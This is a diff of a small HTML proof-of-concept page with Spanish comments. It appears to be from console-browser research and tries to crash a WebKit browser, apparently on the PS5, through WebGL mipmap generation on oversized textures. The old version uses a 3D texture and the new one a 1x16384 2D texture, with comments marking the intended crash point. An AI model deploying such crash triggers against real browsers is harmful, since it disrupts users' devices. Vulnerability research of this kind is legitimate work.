@@ -1,50 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebGL3D Mipmap Crash Test</title>
+  <title>WebGL1 Mipmap Crash PoC (PS5)</title>
   <style>body { background: #000; color: lime; font-family: monospace; }</style>
 </head>
 <body>
-  <h1>WebGL3D Mipmap Crash PoC</h1>
-  <p>Si tu navegador es vulnerable, puede colapsar ahora.</p>
+  <h1>WebGL1 Mipmap Crash PoC</h1>
+  <p>Este test puede colapsar el navegador si es vulnerable.</p>
   <script>
     try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl2");
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl');
 
       if (!gl) {
-        document.body.innerHTML += "<p style='color:red'>WebGL2 no disponible</p>";
-        throw "WebGL2 no soportado.";
+        document.body.innerHTML += "<p style='color:red'>WebGL1 no disponible</p>";
+        throw "WebGL1 no soportado.";
       }
 
-      const tex = gl.createTexture();
-      gl.bindTexture(gl.TEXTURE_3D, tex);
+      const texture = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D, texture);
 
-      const width = 4;
-      const height = 4;
-      const depth = 64; // <<<< Aquí está el crash: depth >> width/height
+      const width = 1;
+      const height = 16384; // tamaño exagerado vertical
+      const data = new Uint8Array(width * height * 4); // RGBA
 
-      const levels = Math.floor(Math.log2(Math.max(width, height, depth))) + 1;
-      const data = new Uint8Array(width * height * depth);
-
-      gl.texImage3D(
-        gl.TEXTURE_3D,
-        0, // mip level
-        gl.R8,
+      // Forzamos una imagen 1x16384 para confundir el mipmapping
+      gl.texImage2D(
+        gl.TEXTURE_2D,
+        0,
+        gl.RGBA,
         width,
         height,
-        depth,
         0,
-        gl.RED,
+        gl.RGBA,
         gl.UNSIGNED_BYTE,
         data
       );
 
-      gl.texParameteri(gl.TEXTURE_3D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
-      gl.texParameteri(gl.TEXTURE_3D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
+      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
+      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
 
-      // 💣 Aquí se forza el crash si WebKit es vulnerable
-      gl.generateMipmap(gl.TEXTURE_3D);
+      // 💣 Este generateMipmap puede causar crash si hay validación incorrecta
+      gl.generateMipmap(gl.TEXTURE_2D);
 
       document.body.innerHTML += "<p style='color:lime'>Mipmap generado sin crash</p>";
 
